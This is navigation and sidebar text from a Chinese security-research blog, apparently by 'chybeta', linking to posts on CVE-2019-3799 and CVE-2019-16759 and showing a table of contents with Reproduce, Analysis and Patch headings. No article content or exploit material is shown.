[【CVE-2019-3799】:Directory Traversal with spring-cloud-config-server](/2019/04/18/%E3%80%90CVE-2019-3799%E3%80%91-Directory-Traversal-with-spring-cloud-config-server/ "【CVE-2019-3799】:Directory Traversal with spring-cloud-config-server")

[【CVE-2019-16759】:pre-auth RCE in vBulletin 5.x](/2019/09/28/%E3%80%90CVE-2019-16759%E3%80%91-pre-auth-RCE-in-vBulletin-5-x/ "【CVE-2019-16759】:pre-auth RCE in vBulletin 5.x")

* 文章目录
* 站点概览

![chybeta](/images/avatar.gif)
[196
日志](/archives)

[13
分类](/categories)

[117
标签](/tags)

[RSS](/atom.xml)

[GitHub](https://github.com/CHYbeta "GitHub")

[Twitter](https://twitter.com/chybeta "Twitter")

Links

* [XMU-Ph0en1x](https://ph0en1x.com/ "XMU-Ph0en1x")
* [lzhtony](https://www.lzhtony.com/ "lzhtony")
* [findneo](https://findneo.github.io/ "findneo")
* [Mads](https://madsome.one/ "Mads")
* [Ginove](https://ginove.github.io/ "Ginove")
* [cltheorem](https://cltheorem.github.io/ "cltheorem")
* [Frank](https://www.cnblogs.com/frankscode/ "Frank")
* [Philhe](https://philhe.coding.me/ "Philhe")

1. [1. 0x01 Reproduce](#0x01-Reproduce)
2. [2. 0x02 Analysis](#0x02-Analysis)
3. [3. 0x03 Patch](#0x03-Patch)

©
2021

chybeta

由 [Hexo](https://hexo.io) 强力驱动

主题 -
[NexT.Muse](https://github.com/iissnan/hexo-theme-next)


